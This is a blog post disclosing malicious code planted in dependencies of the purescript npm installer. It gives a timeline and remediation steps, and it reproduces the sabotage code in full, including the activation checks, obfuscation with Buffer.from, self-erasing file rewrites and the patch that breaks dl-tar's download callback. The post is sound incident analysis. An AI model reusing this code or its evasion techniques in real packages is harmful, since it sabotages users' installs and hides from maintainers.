---
layout: post
title: Malicious code in the purescript npm installer
---

Earlier this week, I found and addressed some malicious code in the purescript
npm installer. The malicious code was inserted into dependencies of the
installer: specifically, packages maintained by [@shinnn][], the original
author of the purescript npm installer, and also the maintainer (until around a
month ago).

There's some important background context I should explain first: after a few
too many disagreements and unpleasant conversations with [@shinnn][] about the
maintenance of the purescript npm installer, we (the compiler maintainers)
recently decided that it would be better if we maintained it ourselves, and
asked him if he would transfer the `purescript` package on npm to us. He
begrudgingly did so. The 0.13.2 PureScript compiler release, which we cut last
week, is the first release of the compiler since we took over the `purescript`
npm package.

### Quick summary

* Malicious code was added to various dependencies of the purescript npm
  installer
* [@shinnn][] claims that the malicious code was published by an attacker who
  gained access to his npm account
* As far as we are aware, the only purpose of the malicious code was to
  sabotage the purescript npm installer to prevent it from running successfully
* In the latest version of the purescript npm installer, the malicious code has
  now been removed, and all dependencies of [@shinnn][]'s have been dropped
* If you want to be absolutely sure you do not have malicious code on your
  machine, you should delete your `node_modules` directories and your
  `package-lock.json` files, and set a lower bound of `0.13.2` on the
  `purescript` package
* We are in ongoing discussion with npm support in order to ascertain what else
  we can do to mitigate the issue

### Where did the malicious code come from?

The code was inserted first into the npm package [`load-from-cwd-or-npm`][] at
version 3.0.2, and later into the npm package [`rate-map`][] starting at
version 1.0.3.  A number of versions of both of these packages were published
over the last few days, and many of them have now been unpublished. As far as I
can tell the only remaining version of `load-from-cwd-or-npm` including any
malicious code is 3.0.2, and the only remaining version of `rate-map` including
any malicious code is version 1.0.3.

### What did it do?

In short, the code sabotages the purescript npm installer to prevent the
download from completing, making the installer hang during the "Check if a
prebuilt binary is provided for your platform" step. The first exploit did this
by breaking the `load-from-cwd-or-npm` package so that any call to
`loadFromCwdOrNpm()` would return a `PassThrough` stream instead of the package
we were expecting (in this case, the `request` package, which we were using for
downloading compiler binaries). The second iteration of the exploit did this by
modifying a source file to prevent a download callback from firing. I've gone
into more detail at the bottom of the post.

### Timeline

This is my current understanding of what happened:

* 5 July, around 1300 UTC: PureScript 0.13.2 released, including version 0.13.2
  of the npm package `purescript`.

  At this point, multiple compiler maintainers were able to successfully
  install the compiler using the npm installer.

* 5 July, around 2100 UTC: `load-from-cwd-or-npm@3.0.2` is published, with an
  exploit breaking the purescript npm installer

  As far as I am aware, this is the first published version of any of
  [@shinnn][]'s packages which includes any malicious code. Now, any person
  trying to install purescript will get the malicious code.

  We soon start receiving bug reports such as [purescript/npm-installer#12][].
  We recommend that people use an alternative installation method while we
  figure out what's going on.

  The compiler maintainers investigate, and for a while, we are stumped. It's
  difficult to reliably reproduce, as the failure doesn't occur in a local
  checkout of the purescript npm installer.

* 9 July, around 0100 UTC: [@doolse][] identifies that
  `load-from-cwd-or-npm@3.0.2` is the cause.

  See [purescript/npm-installer#12 (comment)](https://github.com/purescript/npm-installer/issues/12#issuecomment-509455840)

  [@doolse][] opens an issue on the `load-from-cwd-or-npm` repo pointing out
  that the package is breaking the purescript npm installer (although at this
  stage, none of us spot that the code is malicious). This issue is later
  deleted by [@shinnn][].

* 9 July, around 0500 UTC: `load-from-cwd-or-npm@3.0.4` is published, which no
  longer includes the exploit.

* 9 July, around 0800 UTC: `rate-map@1.0.3` is published, which includes a more
  advanced version of the exploit, now with extra code which removes any trace
  of itself after it has run.

* 9 July, around 1100 UTC: Still not suspecting any bad faith, and thinking the
  `load-from-cwd-or-npm` issue was a genuine bug, I publish a new version of
  the purescript npm installer which vendors a modified version of `dl-tar`
  which does not use `load-from-cwd-or-npm`.

  This fixes the issue for some people, presumably those who have an older
  `rate-map` pinned in their `package-lock.json` files. However, others are
  still able to reproduce the problem, because of the new version of the
  exploit which is now included in `rate-map`.

* 9 July, around 1130 UTC: I spot the malicious code in `rate-map`, and report
  it to npm support.

  Now understanding that this is a deliberate act of bad faith, I start working
  on either vendoring or dropping all dependencies of the purescript npm
  installer which [@shinnn][] maintains.

* 9 July, around 1400 UTC: I publish a new version of the purescript npm
  installer in which every dependency of [@shinnn][]'s has been either dropped
  or vendored (and of course those which I vendored I also audited).

### How has this been addressed?

In the `purescript-installer` package, we have dropped all dependencies which
are maintained by [@shinnn][] as of v0.2.5. We have also marked all earlier
versions of `purescript-installer` as deprecated.

If you install the `purescript` npm package at any version before 0.13.2, you
will still be pulling in packages maintained by [@shinnn][]. I'd suggest
updating as soon as possible, or if you are still using 0.12.x, installing via
some other means. We are currently in discussion with npm's security team to
discuss how best to resolve the issue of previous versions of the `purescript`
package.

### How did the exploits work?

I've archived [complete copies of the packages I've identified including the malicious code in a gist](https://gist.github.com/hdgarrood/358e98b5956e5f7f59c85c2e56534f2b).

#### Exploit version 1: load-from-cwd-or-npm

The first version of the exploit, in `load-from-cwd-or-npm@3.0.2`, occurs in
[lines 50 to 83 of index.js](https://gist.github.com/hdgarrood/358e98b5956e5f7f59c85c2e56534f2b#file-load-from-cwd-or-npm-3-0-2-js-L50-L83):

```
  const tasks = [PassThrough];

  if (argLen === 2) {
    if (typeof args[1] !== 'function') {
      throw new TypeError(`Expected a function to compare two package versions, but got ${
        inspectWithKind(args[1])
      }.`);
    }
  } else {
    tasks.unshift(resolveSemverFromNpm);
  }

  tasks.unshift(resolveFromNpm(modulePkgId));

  try {
    const results = await Promise.all(tasks);
    let parent = module;

    do {
      parent = parent.parent;

      try {
        const {path} = parent;

        if (path.endsWith('cli') || [path, dirname(path)].some(dir => existsSync(resolve(dir, '.git')))) {
          parent = 'npm';
          break;
        }
      } catch (_) {}
    } while (parent);

    if (typeof parent !== 'string') {
      return results[2];
    }
```

This code is a little obfuscated but it didn't take too long for me to work out
what it is doing.

The `tasks` array initially contains just the `PassThrough` stream constructor.
The code then calls `tasks.unshift` twice so that the `PassThrough` constructor
is at index 2 in the `tasks` array. This will be important later.

The first `do`-`while` loop works its way up the `require` chain to try to find
out how the code is being run, by recursively inspecting the `parent` property
of each module in the chain. Then, we have this condition:

```javascript
    if (
      path.endsWith("cli") ||
      [path, dirname(path)].some(dir => existsSync(resolve(dir, ".git")))
    )
```

The purpose of this condition appears to be to decide whether or not to
activate the malicious code. As far as I can tell, the `path.endsWith("cli")`
condition is designed to evaluate to `true` on older versions of the purescript
npm installer; before we took over, the `purescript` npm package depended on
the `install-purescript-cli` package, which is maintained by [@shinnn][]; in
the most recent version of `purescript`, this dependency has been replaced with
the `purescript-installer` package, which we maintain. So the purpose of this
condition seems to be to ensure that the malicious code only runs when our
installer is being used (and not [@shinnn][]'s).

The second condition is checking whether there is a `.git` directory alongside
the file. The purpose of this is presumably to avoid activating the malicious
code when the installer is being run out of a git working directory, to make it
harder to reproduce and track down.

The purpose of the `parent` variable at this stage is just to indicate whether
the malicious code should run or not: if the exploit should be run, then
`parent` will be `undefined`, but if it shouldn't, then it will be set to the
string `"npm"`. We then have this if statement:

```
    if (typeof parent !== 'string') {
      return results[2];
    }
```

which just returns the `PassThrough` constructor in the case where the
malicious code is being run; note that there are no other references to
`results[2]` in the source file.

The effect of this is that when we do `loadFromCwdOrNpm("request")`, we get the
`PassThrough` constructor. So when we have code along the lines of

```
const request = loadFromCwdOrNpm("request");
request("https://github.com/.../archive.tar.gz").pipe(...);
```

nothing happens; no HTTP request is performed.

#### Exploit version 2: rate-map

`rate-map@1.0.3` includes the same `do`-`while` loop to control whether or not
the exploit runs, although it also includes some interesting modifications.

```javascript
let parent = module;
const {
  existsSync: existsSync,
  readFileSync: readFileSync,
  writeFileSync: writeFileSync
} = require("fs");
do {
  parent = parent.parent;
  try {
    const { path: path } = parent;
    if (
      path.endsWith("cli") ||
      [path, dirname(path)].some(dir => existsSync(resolve(dir, ".git")))
    ) {
      parent = "npm";
      break;
    }
  } catch (_) {}
} while (parent);
if (typeof parent !== "string") {
  const px = require.resolve(
    Buffer.from([100, 108, 45, 116, 97, 114]).toString()
  );
  try {
    writeFileSync(
      __filename,
      readFileSync(__filename, "utf8").replace(
        /let parent[^\0]*module\.exports/u,
        "module.exports"
      )
    );
  } catch (_) {}
  try {
    writeFileSync(
      px,
      readFileSync(px, "utf8").replace(/\n\s*cb\(null, chunk\);/u, "")
    );
  } catch (_) {}
}
```

After the `do`-`while` loop, in the case where the exploit code is going to
run, it first resolves the path of the `dl-tar` package on the local
filesystem; note the use of `Buffer.from` to obscure this:

```
> Buffer.from([100, 108, 45, 116, 97, 114]).toString()
'dl-tar'
```

The file path of `index.js` from the `dl-tar` package will now be stored in the
`px` variable. Then, we have this:

```
  try {
    writeFileSync(
      __filename,
      readFileSync(__filename, "utf8").replace(
        /let parent[^\0]*module\.exports/u,
        "module.exports"
      )
    );
  } catch (_) {}
```

which rewrites the current file to remove the malicious code, presumably also
in order to make this exploit harder to track down. Finally, we have this:

```
  try {
    writeFileSync(
      px,
      readFileSync(px, "utf8").replace(/\n\s*cb\(null, chunk\);/u, "")
    );
  } catch (_) {}
```

which replaces any lines in `dl-tar`'s `index.js` file which match the regular
expression `/\n\s*cb\(null, chunk\);/` with empty strings. When running this
code against `dl-tar@0.8.0`, the latest version at the time of writing, it
produces the following diff:

```diff
--- a/home/harry/code/purescript-npm-installer/dl-tar/index.js
+++ b/node_modules/purescript-installer/dl-tar/index.js
@@ -205,6 +205,7 @@ module.exports = function dlTar(...args) {
   new Transform({
     transform(chunk, encoding, cb) {
       unpackStream.responseBytes += chunk.length;
-      cb(null, chunk);
     }
   }),
   unpackStream
```

that is, it removes the call to `cb`, which means that the subscribers to
`dlTar` won't fire.

[@shinnn]: https://github.com/shinnn
[@doolse]: https://github.com/doolse
[`rate-map`]: https://npmjs.com/package/rate-map
[`load-from-cwd-or-npm`]: https://npmjs.com/package/load-from-cwd-or-npm
[purescript/npm-installer#12]: https://github.com/purescript/npm-installer/issues/12
